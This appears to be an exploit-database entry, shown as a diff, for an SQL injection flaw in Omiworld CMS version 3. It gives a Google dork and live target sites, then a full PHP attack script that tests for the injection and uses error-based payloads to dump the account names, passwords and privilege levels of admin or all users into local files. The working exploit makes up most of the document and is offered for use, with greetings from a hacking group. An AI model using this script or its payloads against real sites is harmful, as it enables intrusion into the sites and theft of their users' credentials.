@@ -1,0 +1,180 @@
+id: 18013
+date: 04/09/2012
+title: Omiworld CMS - SQL Injection Vulnerability
+author: The UnKnØwN
+cves: 
+
+====================== Vulnerability info ====================
+[+] Exploit Title : Omiworld CMS - SQL Injection Vulnerability
+[+] Date : 09-04-2012
+[+] Author : The UnKnØwN
+[+] Software Link : http://www.mediafire.com/?ixfs79gw2clicrx
+[+] Version : 3
+[+] Category : Webapps
+[+] Google Dork : intext:Certaines images sont la propriétés de Ankama Games , omiworld
+[+] Tested on : Windows xp
+[+] Demo site : - http://ouragan-games.redheberg.com/ouragan//index.php?pages=home
+                       - http://beta-house.fr/index.php?pages=home
+                       - http://opium.exano.net/index.php?pages=home
+============================ Greets ========================== 
+Greets to : Soka - Hony - CouldFire - kimgx12 - w0dm4n - The Crazy3D Team 
+                                       and all Algerian h4x0rs
+                            www.izzi-hack.com - www.dofus-exploit.com
+===================== Vulnerability details ================== 
+there is an unprotected post in vip_validation.php
+                $personnage = $_POST['perso'];
+$sql = "SELECT * FROM personnages WHERE guid = $personnage";
+=========================== Exploit ==========================
+page : http://site/path/index.php?pages=vip_validation
+post data : send=Envoyer&perso={inject}
+
+There is also an exploit coded in php for Black Hole Reactør (http://www.mediafire.com/?ij9rfpfw6s7uzxf for windows only)
+
+load exploits/webapp/omiworld_injection.php
+set HOST target
+set MODE (1 for admin accounts/2 for all accounts)
+set FILE (save format TXT/SQL)
+exploit
+============================= END =============================
+
+<?php
+//NOTE : If you are using BHR put this file in \exploits\webapp folder
+/*
+!Omiworld_Injection
+@ HOST = localhost = Target URL
+@ PORT = 80 = Target Port
+@ PATH = / = Web site path
+@ MODE = 1 = Injection mode
+@ FILE = sql = Save type
+*/
+error_reporting(0);
+set_time_limit(0);
+ini_set("default_socket_timeout", 5);
+
+function http_send($host,$port, $packet)
+{
+    if (!($sock = fsockopen($host, $port)))
+        die("\n[-] No response from {$host}:{$port}\n");
+ 
+    fputs($sock, $packet);
+    return stream_get_contents($sock);
+}
+function write_txt($host, $file, $account, $pass, $level)
+{
+	$save_file = fopen("".$file."", "a+"); 
+	fwrite($save_file, "$account:$pass:$level\n");
+	fclose($save_file);
+}
+function write_sql($file, $account, $pass, $level)
+{
+	$save_file = fopen("".$file."", "a+");
+	fwrite($save_file, "INSERT INTO 'account_inj' VALUES ('$account', '$pass', '$level')\n");
+	fclose($save_file);
+}
+function write($host, $file)
+{
+	$save_file = fopen("".$file."", "a+");
+	if($file == "accounts.sql")
+		fwrite($save_file, "/* Accounts of $host */\n");
+	else
+		fwrite($save_file, "=========== Accounts of $host ===========\n");
+	fclose($save_file);
+}
+function fetch_data($page)
+{
+	$debut = "~'";
+	$debutTxt = strpos( $page, $debut ) + strlen( $debut ); 
+	$fin = "'~1";
+	$finTxt = strpos( $page, $fin ); 
+	$data_fetch = substr($page, $debutTxt, $finTxt - $debutTxt ); 
+	return $data_fetch;
+}
+function PostIt($host,$port,$path,$payload){
+$packet  = "POST {$path}index.php?pages=vip_validation HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$packet .= "Content-Length: ".strlen($payload)."\r\n";
+$packet .= "Connection: keep-alive\r\n\r\n{$payload}";
+return http_send($host,$port, $packet);
+}
+print "\n+-----------------------[ The Crazy3D Team ]--------------------------+";
+print "\n| OmiWorld CMS SQL Injection Exploit                                  |";
+print "\n|                                by The UnKn0wN                       |";
+print "\n|     Greets to : The Crazy3D's members and all Algerian h4x0rs       |";
+print "\n+---------------------------------------------------------------------+";
+print "\n|           www.Dofus-Exploit.com | WwW.IzzI-Hack.com                 |";
+print "\n+---------------------------------------------------------------------+\n";
+
+if ($argc < 5)
+{
+    print "\nUsage......: php $argv[0] <host> <port> <path> <mode> <save>\n";
+    print "\nExample....: php $argv[0] localhost 80 / 1 txt ";
+    print "\nExample....: php $argv[0] localhost 80 /site/ 3 sql \n";
+    die();
+}
+
+$host = $argv[1];
+$port = $argv[2];
+$path = $argv[3];
+$mode = $argv[4];
+$file = $argv[5];
+
+if($file == "txt") $file = "accounts.txt";
+else $file = "accounts.sql";
+$inj_test = "or '1'='1";
+$inj_db = " and(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,cast(database() as char),0x27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1";
+$payload = "send=Envoyer&perso=test".$inj_test."";
+
+if(!(preg_match("#Erreur SQL#", postit($host,$port, $path,$payload)))) die ("[-] CMS not vulnerable\n");
+else print ("[+] CMS can be exploited!\n");
+$payload = "send=Envoyer&perso=test".$inj_db."";
+$db = fetch_data(PostIt($host,$port,$path,$payload));
+if(empty($db)) die("[-] Can't found the database!\n");
+print "[+] Database: ".$db."\n";
+switch ($mode)
+{
+case 1:
+$inj_count_accounts = " and(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,count(*),0x27,0x7e) FROM `".$db."`.accounts WHERE level>0)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1";
+$payload = "send=Envoyer&perso=test".$inj_count_accounts."";
+$num = fetch_data(PostIt($host,$port,$path,$payload));
+print "[+] Admin accounts: ".$num."\n";
+for($i=0; $i<$num; $i++)
+{
+$inj_accounts = " and(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,account,0x2f,pass,0x2f,level,0x27,0x7e) FROM `{$db}`.accounts WHERE level>0 LIMIT {$i},1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1";	
+$payload = "send=Envoyer&perso=test".$inj_accounts."";
+$data = fetch_data(PostIt($host,$port,$path,$payload));
+
+list($account, $pass, $level) = split('[/.-]', $data);
+print "Account: {$account}\t Pass: {$pass}\t  Level: {$level}\n";
+	
+if($file == "accounts.txt") 
+write_txt($file, $account, $pass, $level);			
+else 
+write_sql($file, $account, $pass, $level);
+}
+break;
+case 2:
+$inj_count_accounts = " and(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,count(*),0x27,0x7e) FROM `".$db."`.accounts)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1";
+$payload = "send=Envoyer&perso=test".$inj_count_accounts."";
+$num = fetch_data(PostIt($host,$port,$path,$payload));
+print "[+] Accounts: ".$num."\n";
+for($i=0; $i<$num; $i++)
+{
+$inj_accounts = " and(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,account,0x2f,pass,0x2f,level,0x27,0x7e) FROM `{$db}`.accounts LIMIT {$i},1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1";	
+$payload = "send=Envoyer&perso=test".$inj_accounts."";
+$data = fetch_data(PostIt($host,$port,$path,$payload));
+
+list($account, $pass, $level) = split('[/.-]', $data);
+print "Account: {$account}\t Pass: {$pass}\t  Level: {$level}\n";
+	
+if($file == "accounts.txt") 
+write_txt($file, $account, $pass, $level);			
+else 
+write_sql($file, $account, $pass, $level);
+}
+break; 
+}
+
+
+
+#  0day.today [2023-03-26]  #
